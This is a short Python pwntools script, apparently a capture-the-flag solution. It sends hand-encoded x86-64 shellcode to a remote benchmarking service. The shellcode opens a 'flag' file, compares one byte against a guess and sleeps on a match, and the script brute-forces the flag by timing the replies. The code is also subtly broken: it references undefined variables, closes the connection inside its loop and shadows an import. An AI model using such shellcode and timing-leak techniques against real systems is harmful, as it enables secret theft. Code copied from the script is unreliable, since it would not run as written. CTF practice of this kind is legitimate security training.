from pwn import *
from time import time


context.clear(arch='amd64',os='linux')
run_local = False
if run_local:
	r= process('./benchmarking_service')
else:
	r=remote("bin2.ctf.offdef.it",4001)

for index in range(32, 40):
	for char_value in range(33, 127):
		
		shellcode=b"\x31\xC0\xFF\xC0\xFF\xC0\x31\xF6\x48\xC7\xC3\x66\x6C\x61\x67\x53\x48\x89\xE7\x0F\x05\x48\x89\xC7\x31\xC0\x48\x89\xE6\xBA\x20\x00\x00\x00\x0F\x05\x48\x31\xFF\x48\x83\xC6"+index_val+b"\x40\x8A\xBE\x00\x00\x00\x00\x40\x80\xFF"+value+b"\x75\x1E\x4D\x31\xE4\x41\x54\x48\xC7\xC7\x01\x00\x00\x00\x57\xB8\x23\x00\x00\x00\x48\x89\xE7\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05\x90"
		print(shellcode)
		shellcode=shellcode.ljust(1024,b"\x90")
	
		r.recvuntil(b"Shellcode:")
	
		r.sendline(shellcode)
		r.recvuntil(b"Time: ")
		time=r.recv(4)
		r.close()
		hello =time.decode("ascii")
		print(hello)
		if(float(hello)>1):
			print(str(value))
			f = open("flag", "a")
			f.write(str(value))
			f.close()	
